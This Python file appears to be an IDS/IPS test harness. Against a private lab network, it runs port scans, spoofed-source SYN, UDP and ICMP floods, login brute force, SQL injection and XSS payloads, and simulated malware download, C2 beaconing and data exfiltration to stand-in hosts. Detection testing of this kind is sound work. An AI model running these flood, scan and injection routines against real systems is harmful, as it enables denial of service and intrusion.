#!/usr/bin/env python3
"""
Attack Simulation and Testing System for IDS/IPS
Generates various attack scenarios to test detection capabilities
"""

import socket
import threading
import time
import random
import requests
import subprocess
import json
import hashlib
import os
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass
import scapy.all as scapy
from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers.http import HTTP, HTTPRequest
import concurrent.futures

@dataclass
class AttackScenario:
    name: str
    description: str
    attack_type: str
    severity: str
    duration: int  # seconds
    target_ip: str
    target_port: Optional[int] = None
    source_ips: Optional[List[str]] = None
    parameters: Optional[Dict[str, Any]] = None

class AttackSimulator:
    """Comprehensive attack simulation for testing IDS/IPS capabilities"""
    
    def __init__(self, target_network: str = "192.168.1.0/24", 
                 api_endpoint: str = "http://localhost:5000/api"):
        self.target_network = target_network
        self.api_endpoint = api_endpoint
        self.results = []
        self.running_attacks = {}
        
        # Common attack source IPs (simulated external attackers)
        self.attacker_ips = [
            "203.0.113.10", "198.51.100.20", "192.0.2.30",
            "203.0.113.40", "198.51.100.50", "192.0.2.60",
            "203.0.113.70", "198.51.100.80", "192.0.2.90"
        ]
        
        # Target IPs in the network
        self.target_ips = [
            "192.168.1.10", "192.168.1.20", "192.168.1.30",
            "192.168.1.100", "192.168.1.200"
        ]
        
        # Common ports for attacks
        self.common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3389, 5432, 3306]
        
        print(f"Attack Simulator initialized")
        print(f"Target Network: {target_network}")
        print(f"API Endpoint: {api_endpoint}")
    
    def create_attack_scenarios(self) -> List[AttackScenario]:
        """Create comprehensive attack scenarios for testing"""
        scenarios = []
        
        # 1. Port Scanning Attacks
        scenarios.append(AttackScenario(
            name="TCP Port Scan",
            description="Systematic TCP port scanning to discover open services",
            attack_type="port_scan",
            severity="MEDIUM",
            duration=30,
            target_ip="192.168.1.100",
            parameters={
                "scan_type": "tcp",
                "port_range": "1-1000",
                "scan_rate": 10  # ports per second
            }
        ))
        
        scenarios.append(AttackScenario(
            name="UDP Port Scan",
            description="UDP port scanning for service discovery",
            attack_type="port_scan",
            severity="MEDIUM",
            duration=20,
            target_ip="192.168.1.100",
            parameters={
                "scan_type": "udp",
                "port_range": "53,123,161,500",
                "scan_rate": 5
            }
        ))
        
        scenarios.append(AttackScenario(
            name="Stealth SYN Scan",
            description="Stealthy SYN scanning to avoid detection",
            attack_type="port_scan",
            severity="HIGH",
            duration=45,
            target_ip="192.168.1.100",
            parameters={
                "scan_type": "syn",
                "port_range": "1-65535",
                "scan_rate": 2,
                "randomize": True
            }
        ))
        
        # 2. Brute Force Attacks
        scenarios.append(AttackScenario(
            name="SSH Brute Force",
            description="Dictionary attack against SSH service",
            attack_type="brute_force",
            severity="HIGH",
            duration=60,
            target_ip="192.168.1.10",
            target_port=22,
            parameters={
                "service": "ssh",
                "usernames": ["admin", "root", "user", "test"],
                "passwords": ["password", "123456", "admin", "root"],
                "rate": 2  # attempts per second
            }
        ))
        
        scenarios.append(AttackScenario(
            name="HTTP Login Brute Force",
            description="Web application login brute force attack",
            attack_type="brute_force",
            severity="HIGH",
            duration=45,
            target_ip="192.168.1.100",
            target_port=80,
            parameters={
                "service": "http",
                "endpoint": "/login",
                "usernames": ["admin", "user"],
                "passwords": ["password", "123456", "admin"],
                "rate": 3
            }
        ))
        
        # 3. DDoS Attacks
        scenarios.append(AttackScenario(
            name="TCP SYN Flood",
            description="TCP SYN flood attack to exhaust server resources",
            attack_type="ddos",
            severity="CRITICAL",
            duration=30,
            target_ip="192.168.1.100",
            target_port=80,
            source_ips=self.attacker_ips[:5],
            parameters={
                "attack_type": "syn_flood",
                "packet_rate": 100,  # packets per second per source
                "randomize_source": True
            }
        ))
        
        scenarios.append(AttackScenario(
            name="UDP Flood",
            description="UDP flood attack targeting multiple ports",
            attack_type="ddos",
            severity="CRITICAL",
            duration=25,
            target_ip="192.168.1.100",
            source_ips=self.attacker_ips[:3],
            parameters={
                "attack_type": "udp_flood",
                "packet_rate": 150,
                "target_ports": [53, 123, 161]
            }
        ))
        
        scenarios.append(AttackScenario(
            name="ICMP Flood",
            description="ICMP ping flood attack",
            attack_type="ddos",
            severity="HIGH",
            duration=20,
            target_ip="192.168.1.100",
            source_ips=self.attacker_ips[:4],
            parameters={
                "attack_type": "icmp_flood",
                "packet_rate": 50,
                "packet_size": 1024
            }
        ))
        
        # 4. Malware Simulation
        scenarios.append(AttackScenario(
            name="Malware Download",
            description="Simulated malware download and execution",
            attack_type="malware",
            severity="CRITICAL",
            duration=15,
            target_ip="192.168.1.50",
            parameters={
                "malware_type": "trojan",
                "download_url": "http://malicious-site.example.com/payload.exe",
                "file_hash": "a1b2c3d4e5f6789012345678901234567890abcd",
                "behavior": "keylogger"
            }
        ))
        
        scenarios.append(AttackScenario(
            name="Botnet Communication",
            description="Simulated botnet command and control communication",
            attack_type="malware",
            severity="HIGH",
            duration=30,
            target_ip="192.168.1.75",
            parameters={
                "malware_type": "botnet",
                "c2_server": "203.0.113.100",
                "communication_interval": 5,
                "encrypted": True
            }
        ))
        
        # 5. Web Application Attacks
        scenarios.append(AttackScenario(
            name="SQL Injection",
            description="SQL injection attack against web application",
            attack_type="web_attack",
            severity="HIGH",
            duration=20,
            target_ip="192.168.1.100",
            target_port=80,
            parameters={
                "attack_type": "sql_injection",
                "endpoint": "/search",
                "payloads": [
                    "' OR '1'='1",
                    "'; DROP TABLE users; --",
                    "' UNION SELECT * FROM passwords --"
                ]
            }
        ))
        
        scenarios.append(AttackScenario(
            name="Cross-Site Scripting (XSS)",
            description="XSS attack targeting web application users",
            attack_type="web_attack",
            severity="MEDIUM",
            duration=15,
            target_ip="192.168.1.100",
            target_port=80,
            parameters={
                "attack_type": "xss",
                "endpoint": "/comment",
                "payloads": [
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert('XSS')>",
                    "javascript:alert('XSS')"
                ]
            }
        ))
        
        # 6. Network Reconnaissance
        scenarios.append(AttackScenario(
            name="Network Discovery",
            description="Network reconnaissance and host discovery",
            attack_type="reconnaissance",
            severity="LOW",
            duration=40,
            target_ip="192.168.1.0/24",
            parameters={
                "scan_type": "ping_sweep",
                "additional_probes": ["arp", "dns_lookup"],
                "stealth_mode": True
            }
        ))
        
        scenarios.append(AttackScenario(
            name="Service Enumeration",
            description="Detailed service and version enumeration",
            attack_type="reconnaissance",
            severity="MEDIUM",
            duration=35,
            target_ip="192.168.1.100",
            parameters={
                "scan_type": "service_enum",
                "probe_depth": "aggressive",
                "os_detection": True,
                "version_detection": True
            }
        ))
        
        # 7. Phishing Simulation
        scenarios.append(AttackScenario(
            name="Phishing Email",
            description="Simulated phishing email with malicious link",
            attack_type="phishing",
            severity="HIGH",
            duration=10,
            target_ip="192.168.1.25",
            parameters={
                "email_type": "credential_harvest",
                "spoofed_domain": "bank-security.example.com",
                "target_service": "online_banking",
                "link_destination": "http://phishing-site.example.com/login"
            }
        ))
        
        # 8. Data Exfiltration
        scenarios.append(AttackScenario(
            name="Data Exfiltration",
            description="Simulated sensitive data exfiltration",
            attack_type="data_exfiltration",
            severity="CRITICAL",
            duration=25,
            target_ip="192.168.1.200",
            parameters={
                "exfil_method": "http_post",
                "destination": "203.0.113.200",
                "data_type": "customer_database",
                "encryption": "base64",
                "chunk_size": 1024
            }
        ))
        
        return scenarios
    
    def run_attack_scenario(self, scenario: AttackScenario) -> Dict[str, Any]:
        """Execute a specific attack scenario"""
        print(f"\n🚨 Starting Attack: {scenario.name}")
        print(f"   Description: {scenario.description}")
        print(f"   Type: {scenario.attack_type}, Severity: {scenario.severity}")
        print(f"   Duration: {scenario.duration}s, Target: {scenario.target_ip}")
        
        start_time = datetime.now()
        result = {
            "scenario": scenario.name,
            "attack_type": scenario.attack_type,
            "severity": scenario.severity,
            "start_time": start_time.isoformat(),
            "duration": scenario.duration,
            "target_ip": scenario.target_ip,
            "success": False,
            "packets_sent": 0,
            "responses_received": 0,
            "detected": False,
            "blocked": False,
            "alerts_generated": [],
            "error": None
        }
        
        try:
            # Execute attack based on type
            if scenario.attack_type == "port_scan":
                result.update(self._execute_port_scan(scenario))
            elif scenario.attack_type == "brute_force":
                result.update(self._execute_brute_force(scenario))
            elif scenario.attack_type == "ddos":
                result.update(self._execute_ddos(scenario))
            elif scenario.attack_type == "malware":
                result.update(self._execute_malware_simulation(scenario))
            elif scenario.attack_type == "web_attack":
                result.update(self._execute_web_attack(scenario))
            elif scenario.attack_type == "reconnaissance":
                result.update(self._execute_reconnaissance(scenario))
            elif scenario.attack_type == "phishing":
                result.update(self._execute_phishing_simulation(scenario))
            elif scenario.attack_type == "data_exfiltration":
                result.update(self._execute_data_exfiltration(scenario))
            else:
                result["error"] = f"Unknown attack type: {scenario.attack_type}"
            
            # Check if attack was detected by IDS/IPS
            time.sleep(2)  # Wait for detection processing
            detection_result = self._check_detection(scenario, start_time)
            result.update(detection_result)
            
        except Exception as e:
            result["error"] = str(e)
            print(f"   ❌ Attack failed: {e}")
        
        end_time = datetime.now()
        result["end_time"] = end_time.isoformat()
        result["actual_duration"] = (end_time - start_time).total_seconds()
        
        # Print results
        if result["success"]:
            print(f"   ✅ Attack completed successfully")
            print(f"   📊 Packets sent: {result['packets_sent']}")
            if result["detected"]:
                print(f"   🔍 Attack was DETECTED by IDS/IPS")
                print(f"   🚫 Attack was {'BLOCKED' if result['blocked'] else 'NOT BLOCKED'}")
                print(f"   📢 Alerts generated: {len(result['alerts_generated'])}")
            else:
                print(f"   ⚠️  Attack was NOT DETECTED")
        else:
            print(f"   ❌ Attack failed: {result.get('error', 'Unknown error')}")
        
        self.results.append(result)
        return result
    
    def _execute_port_scan(self, scenario: AttackScenario) -> Dict[str, Any]:
        """Execute port scanning attack"""
        params = scenario.parameters or {}
        scan_type = params.get("scan_type", "tcp")
        port_range = params.get("port_range", "1-1000")
        scan_rate = params.get("scan_rate", 10)
        
        result = {"success": True, "packets_sent": 0, "responses_received": 0}
        
        # Parse port range
        if "-" in port_range:
            start_port, end_port = map(int, port_range.split("-"))
            ports = list(range(start_port, min(end_port + 1, 1001)))  # Limit for demo
        else:
            ports = [int(p) for p in port_range.split(",")]
        
        # Randomize if requested
        if params.get("randomize", False):
            random.shuffle(ports)
        
        source_ip = random.choice(self.attacker_ips)
        
        for port in ports[:100]:  # Limit for demo
            try:
                if scan_type == "tcp":
                    # TCP connect scan
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    result_code = sock.connect_ex((scenario.target_ip, port))
                    sock.close()
                    
                    result["packets_sent"] += 1
                    if result_code == 0:
                        result["responses_received"] += 1
                
                elif scan_type == "syn":
                    # SYN scan using scapy
                    packet = IP(src=source_ip, dst=scenario.target_ip) / TCP(dport=port, flags="S")
                    response = scapy.sr1(packet, timeout=0.5, verbose=0)
                    
                    result["packets_sent"] += 1
                    if response and response.haslayer(TCP):
                        result["responses_received"] += 1
                
                elif scan_type == "udp":
                    # UDP scan
                    packet = IP(src=source_ip, dst=scenario.target_ip) / UDP(dport=port)
                    response = scapy.sr1(packet, timeout=0.5, verbose=0)
                    
                    result["packets_sent"] += 1
                    if response:
                        result["responses_received"] += 1
                
                # Rate limiting
                time.sleep(1.0 / scan_rate)
                
            except Exception as e:
                continue
        
        return result
    
    def _execute_brute_force(self, scenario: AttackScenario) -> Dict[str, Any]:
        """Execute brute force attack"""
        params = scenario.parameters or {}
        service = params.get("service", "ssh")
        usernames = params.get("usernames", ["admin"])
        passwords = params.get("passwords", ["password"])
        rate = params.get("rate", 1)
        
        result = {"success": True, "packets_sent": 0, "responses_received": 0}
        source_ip = random.choice(self.attacker_ips)
        
        for username in usernames:
            for password in passwords:
                try:
                    if service == "ssh":
                        # Simulate SSH brute force
                        # In real implementation, would use paramiko or similar
                        result["packets_sent"] += 1
                        
                        # Simulate connection attempt
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(2)
                        try:
                            sock.connect((scenario.target_ip, scenario.target_port))
                            result["responses_received"] += 1
                            sock.close()
                        except:
                            pass
                    
                    elif service == "http":
                        # Simulate HTTP login brute force
                        endpoint = params.get("endpoint", "/login")
                        url = f"http://{scenario.target_ip}:{scenario.target_port}{endpoint}"
                        
                        data = {
                            "username": username,
                            "password": password
                        }
                        
                        try:
                            response = requests.post(url, data=data, timeout=2)
                            result["packets_sent"] += 1
                            result["responses_received"] += 1
                        except:
                            result["packets_sent"] += 1
                    
                    # Rate limiting
                    time.sleep(1.0 / rate)
                    
                except Exception as e:
                    continue
        
        return result
    
    def _execute_ddos(self, scenario: AttackScenario) -> Dict[str, Any]:
        """Execute DDoS attack"""
        params = scenario.parameters or {}
        attack_type = params.get("attack_type", "syn_flood")
        packet_rate = params.get("packet_rate", 100)
        source_ips = scenario.source_ips or [random.choice(self.attacker_ips)]
        
        result = {"success": True, "packets_sent": 0, "responses_received": 0}
        
        def flood_worker(source_ip, duration):
            end_time = time.time() + duration
            packets_sent = 0
            
            while time.time() < end_time:
                try:
                    if attack_type == "syn_flood":
                        # TCP SYN flood
                        packet = IP(src=source_ip, dst=scenario.target_ip) / \
                                TCP(dport=scenario.target_port, flags="S", 
                                   sport=random.randint(1024, 65535))
                        scapy.send(packet, verbose=0)
                        packets_sent += 1
                    
                    elif attack_type == "udp_flood":
                        # UDP flood
                        target_ports = params.get("target_ports", [53])
                        port = random.choice(target_ports)
                        packet = IP(src=source_ip, dst=scenario.target_ip) / \
                                UDP(dport=port, sport=random.randint(1024, 65535)) / \
                                ("X" * random.randint(100, 1000))
                        scapy.send(packet, verbose=0)
                        packets_sent += 1
                    
                    elif attack_type == "icmp_flood":
                        # ICMP flood
                        packet_size = params.get("packet_size", 64)
                        packet = IP(src=source_ip, dst=scenario.target_ip) / \
                                ICMP() / ("X" * packet_size)
                        scapy.send(packet, verbose=0)
                        packets_sent += 1
                    
                    # Rate limiting
                    time.sleep(1.0 / packet_rate)
                    
                except Exception as e:
                    continue
            
            return packets_sent
        
        # Launch flood from multiple source IPs
        with concurrent.futures.ThreadPoolExecutor(max_workers=len(source_ips)) as executor:
            futures = []
            for source_ip in source_ips:
                future = executor.submit(flood_worker, source_ip, scenario.duration)
                futures.append(future)
            
            # Collect results
            for future in concurrent.futures.as_completed(futures):
                try:
                    packets_sent = future.result()
                    result["packets_sent"] += packets_sent
                except Exception as e:
                    continue
        
        return result
    
    def _execute_malware_simulation(self, scenario: AttackScenario) -> Dict[str, Any]:
        """Simulate malware activity"""
        params = scenario.parameters or {}
        malware_type = params.get("malware_type", "trojan")
        
        result = {"success": True, "packets_sent": 0, "responses_received": 0}
        
        if malware_type == "trojan":
            # Simulate malware download
            download_url = params.get("download_url", "http://malicious-site.com/payload.exe")
            file_hash = params.get("file_hash", "deadbeef" * 8)
            
            # Simulate HTTP request to download malware
            try:
                response = requests.get(download_url, timeout=2)
                result["packets_sent"] += 1
                result["responses_received"] += 1
            except:
                result["packets_sent"] += 1
            
            # Simulate file creation with known malicious hash
            temp_file = f"/tmp/malware_{file_hash[:8]}.exe"
            with open(temp_file, "wb") as f:
                f.write(b"MALICIOUS_PAYLOAD_SIMULATION")
            
            # Clean up
            os.remove(temp_file)
        
        elif malware_type == "botnet":
            # Simulate botnet C2 communication
            c2_server = params.get("c2_server", "203.0.113.100")
            interval = params.get("communication_interval", 5)
            encrypted = params.get("encrypted", False)
            
            end_time = time.time() + scenario.duration
            while time.time() < end_time:
                try:
                    # Simulate C2 communication
                    if encrypted:
                        # Simulate encrypted communication
                        packet = IP(src=scenario.target_ip, dst=c2_server) / \
                                TCP(dport=443) / ("ENCRYPTED_C2_DATA" * 10)
                    else:
                        packet = IP(src=scenario.target_ip, dst=c2_server) / \
                                TCP(dport=8080) / ("C2_COMMAND_REQUEST")
                    
                    scapy.send(packet, verbose=0)
                    result["packets_sent"] += 1
                    
                    time.sleep(interval)
                    
                except Exception as e:
                    continue
        
        return result
    
    def _execute_web_attack(self, scenario: AttackScenario) -> Dict[str, Any]:
        """Execute web application attack"""
        params = scenario.parameters or {}
        attack_type = params.get("attack_type", "sql_injection")
        endpoint = params.get("endpoint", "/")
        payloads = params.get("payloads", ["test"])
        
        result = {"success": True, "packets_sent": 0, "responses_received": 0}
        base_url = f"http://{scenario.target_ip}:{scenario.target_port}"
        
        for payload in payloads:
            try:
                if attack_type == "sql_injection":
                    # SQL injection in GET parameter
                    url = f"{base_url}{endpoint}?id={payload}"
                    response = requests.get(url, timeout=2)
                    result["packets_sent"] += 1
                    result["responses_received"] += 1
                
                elif attack_type == "xss":
                    # XSS in POST data
                    url = f"{base_url}{endpoint}"
                    data = {"comment": payload}
                    response = requests.post(url, data=data, timeout=2)
                    result["packets_sent"] += 1
                    result["responses_received"] += 1
                
                time.sleep(1)  # Rate limiting
                
            except Exception as e:
                result["packets_sent"] += 1
                continue
        
        return result
    
    def _execute_reconnaissance(self, scenario: AttackScenario) -> Dict[str, Any]:
        """Execute reconnaissance attack"""
        params = scenario.parameters or {}
        scan_type = params.get("scan_type", "ping_sweep")
        
        result = {"success": True, "packets_sent": 0, "responses_received": 0}
        source_ip = random.choice(self.attacker_ips)
        
        if scan_type == "ping_sweep":
            # Ping sweep of network
            network_base = ".".join(scenario.target_ip.split(".")[:-1])
            
            for i in range(1, 255):
                target = f"{network_base}.{i}"
                try:
                    packet = IP(src=source_ip, dst=target) / ICMP()
                    response = scapy.sr1(packet, timeout=0.5, verbose=0)
                    
                    result["packets_sent"] += 1
                    if response:
                        result["responses_received"] += 1
                    
                    time.sleep(0.1)  # Rate limiting
                    
                except Exception as e:
                    continue
        
        elif scan_type == "service_enum":
            # Service enumeration on target
            for port in self.common_ports:
                try:
                    # TCP service probe
                    packet = IP(src=source_ip, dst=scenario.target_ip) / TCP(dport=port, flags="S")
                    response = scapy.sr1(packet, timeout=0.5, verbose=0)
                    
                    result["packets_sent"] += 1
                    if response and response.haslayer(TCP) and response[TCP].flags == 18:  # SYN-ACK
                        result["responses_received"] += 1
                        
                        # Send RST to close connection
                        rst_packet = IP(src=source_ip, dst=scenario.target_ip) / \
                                   TCP(dport=port, flags="R")
                        scapy.send(rst_packet, verbose=0)
                    
                    time.sleep(0.2)
                    
                except Exception as e:
                    continue
        
        return result
    
    def _execute_phishing_simulation(self, scenario: AttackScenario) -> Dict[str, Any]:
        """Simulate phishing attack"""
        params = scenario.parameters or {}
        email_type = params.get("email_type", "credential_harvest")
        spoofed_domain = params.get("spoofed_domain", "bank-security.com")
        
        result = {"success": True, "packets_sent": 0, "responses_received": 0}
        
        # Simulate DNS lookup for spoofed domain
        try:
            packet = IP(src=scenario.target_ip, dst="8.8.8.8") / \
                    UDP(dport=53) / f"DNS_QUERY_{spoofed_domain}"
            scapy.send(packet, verbose=0)
            result["packets_sent"] += 1
        except:
            pass
        
        # Simulate HTTP request to phishing site
        try:
            phishing_url = params.get("link_destination", f"http://{spoofed_domain}/login")
            response = requests.get(phishing_url, timeout=2)
            result["packets_sent"] += 1
            result["responses_received"] += 1
        except:
            result["packets_sent"] += 1
        
        return result
    
    def _execute_data_exfiltration(self, scenario: AttackScenario) -> Dict[str, Any]:
        """Simulate data exfiltration"""
        params = scenario.parameters or {}
        exfil_method = params.get("exfil_method", "http_post")
        destination = params.get("destination", "203.0.113.200")
        chunk_size = params.get("chunk_size", 1024)
        
        result = {"success": True, "packets_sent": 0, "responses_received": 0}
        
        # Simulate data exfiltration
        total_data = 10 * 1024  # 10KB of "sensitive data"
        chunks = total_data // chunk_size
        
        for i in range(chunks):
            try:
                if exfil_method == "http_post":
                    # HTTP POST exfiltration
                    data = {"chunk": i, "data": "SENSITIVE_DATA" * (chunk_size // 14)}
                    url = f"http://{destination}/upload"
                    response = requests.post(url, data=data, timeout=2)
                    result["packets_sent"] += 1
                    result["responses_received"] += 1
                
                elif exfil_method == "dns_tunnel":
                    # DNS tunneling exfiltration
                    encoded_data = f"data{i}.{destination}"
                    packet = IP(src=scenario.target_ip, dst="8.8.8.8") / \
                            UDP(dport=53) / f"DNS_QUERY_{encoded_data}"
                    scapy.send(packet, verbose=0)
                    result["packets_sent"] += 1
                
                time.sleep(0.5)  # Rate limiting
                
            except Exception as e:
                result["packets_sent"] += 1
                continue
        
        return result
    
    def _check_detection(self, scenario: AttackScenario, start_time: datetime) -> Dict[str, Any]:
        """Check if the attack was detected by the IDS/IPS system"""
        detection_result = {
            "detected": False,
            "blocked": False,
            "alerts_generated": []
        }
        
        try:
            # Query the IDS/IPS API for alerts generated during the attack
            end_time = datetime.now()
            
            params = {
                "start_time": start_time.isoformat(),
                "end_time": end_time.isoformat(),
                "limit": 100
            }
            
            response = requests.get(f"{self.api_endpoint}/alerts", params=params, timeout=5)
            
            if response.status_code == 200:
                data = response.json()
                alerts = data.get("alerts", [])
                
                # Check for alerts related to this attack
                relevant_alerts = []
                for alert in alerts:
                    # Check if alert matches attack characteristics
                    if (alert.get("source_ip") in (scenario.source_ips or []) or
                        alert.get("destination_ip") == scenario.target_ip or
                        scenario.attack_type in alert.get("threat_type", "").lower() or
                        scenario.attack_type in alert.get("title", "").lower()):
                        relevant_alerts.append(alert)
                
                if relevant_alerts:
                    detection_result["detected"] = True
                    detection_result["alerts_generated"] = relevant_alerts
                    
                    # Check if any blocking action was taken
                    for alert in relevant_alerts:
                        if "block" in alert.get("action_taken", "").lower():
                            detection_result["blocked"] = True
                            break
            
            # Also check blocked IPs
            try:
                response = requests.get(f"{self.api_endpoint}/blocked-ips", timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    blocked_ips = [ip["ip"] for ip in data.get("blocked_ips", [])]
                    
                    # Check if any attack source IPs were blocked
                    if scenario.source_ips:
                        for source_ip in scenario.source_ips:
                            if source_ip in blocked_ips:
                                detection_result["blocked"] = True
                                break
            except:
                pass
                
        except Exception as e:
            print(f"   ⚠️  Could not check detection status: {e}")
        
        return detection_result
    
    def run_comprehensive_test(self) -> Dict[str, Any]:
        """Run comprehensive attack testing suite"""
        print("🔥 Starting Comprehensive IDS/IPS Attack Testing Suite")
        print("=" * 60)
        
        scenarios = self.create_attack_scenarios()
        test_results = {
            "start_time": datetime.now().isoformat(),
            "total_scenarios": len(scenarios),
            "results": [],
            "summary": {
                "successful_attacks": 0,
                "detected_attacks": 0,
                "blocked_attacks": 0,
                "failed_attacks": 0
            }
        }
        
        for i, scenario in enumerate(scenarios, 1):
            print(f"\n[{i}/{len(scenarios)}] Running: {scenario.name}")
            
            result = self.run_attack_scenario(scenario)
            test_results["results"].append(result)
            
            # Update summary
            if result["success"]:
                test_results["summary"]["successful_attacks"] += 1
                if result["detected"]:
                    test_results["summary"]["detected_attacks"] += 1
                if result["blocked"]:
                    test_results["summary"]["blocked_attacks"] += 1
            else:
                test_results["summary"]["failed_attacks"] += 1
            
            # Wait between attacks
            time.sleep(5)
        
        test_results["end_time"] = datetime.now().isoformat()
        
        # Print final summary
        self._print_test_summary(test_results)
        
        # Save results to file
        results_file = Path(f"attack_test_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
        with open(results_file, 'w') as f:
            json.dump(test_results, f, indent=2)
        
        print(f"\n📄 Detailed results saved to: {results_file}")
        
        return test_results
    
    def _print_test_summary(self, test_results: Dict[str, Any]):
        """Print comprehensive test summary"""
        summary = test_results["summary"]
        
        print("\n" + "=" * 60)
        print("🎯 COMPREHENSIVE TEST RESULTS SUMMARY")
        print("=" * 60)
        
        print(f"📊 Total Attack Scenarios: {test_results['total_scenarios']}")
        print(f"✅ Successful Attacks: {summary['successful_attacks']}")
        print(f"❌ Failed Attacks: {summary['failed_attacks']}")
        print(f"🔍 Detected Attacks: {summary['detected_attacks']}")
        print(f"🚫 Blocked Attacks: {summary['blocked_attacks']}")
        
        if summary['successful_attacks'] > 0:
            detection_rate = (summary['detected_attacks'] / summary['successful_attacks']) * 100
            blocking_rate = (summary['blocked_attacks'] / summary['successful_attacks']) * 100
            
            print(f"\n📈 PERFORMANCE METRICS:")
            print(f"   Detection Rate: {detection_rate:.1f}%")
            print(f"   Blocking Rate: {blocking_rate:.1f}%")
            
            if detection_rate >= 90:
                print("   🏆 EXCELLENT detection performance!")
            elif detection_rate >= 70:
                print("   👍 GOOD detection performance")
            elif detection_rate >= 50:
                print("   ⚠️  MODERATE detection performance")
            else:
                print("   🚨 POOR detection performance - needs improvement")
        
        print("\n📋 ATTACK TYPE BREAKDOWN:")
        attack_types = {}
        for result in test_results["results"]:
            attack_type = result["attack_type"]
            if attack_type not in attack_types:
                attack_types[attack_type] = {"total": 0, "detected": 0, "blocked": 0}
            
            attack_types[attack_type]["total"] += 1
            if result["detected"]:
                attack_types[attack_type]["detected"] += 1
            if result["blocked"]:
                attack_types[attack_type]["blocked"] += 1
        
        for attack_type, stats in attack_types.items():
            detection_rate = (stats["detected"] / stats["total"]) * 100 if stats["total"] > 0 else 0
            print(f"   {attack_type.upper()}: {stats['detected']}/{stats['total']} detected ({detection_rate:.0f}%)")
        
        print("\n🔧 RECOMMENDATIONS:")
        if summary['detected_attacks'] < summary['successful_attacks']:
            print("   • Review and update detection signatures")
            print("   • Adjust anomaly detection thresholds")
            print("   • Enable additional detection methods")
        
        if summary['blocked_attacks'] < summary['detected_attacks']:
            print("   • Enable automatic IP blocking for high-severity threats")
            print("   • Review blocking policies and thresholds")
        
        if summary['failed_attacks'] > 0:
            print("   • Check network connectivity and target accessibility")
            print("   • Review attack simulation parameters")
        
        print("=" * 60)

# Example usage and testing
if __name__ == "__main__":
    # Initialize attack simulator
    simulator = AttackSimulator(
        target_network="192.168.1.0/24",
        api_endpoint="http://localhost:5000/api"
    )
    
    # Run comprehensive testing
    results = simulator.run_comprehensive_test()
    
    print(f"\nTesting completed. Check the results file for detailed analysis.")

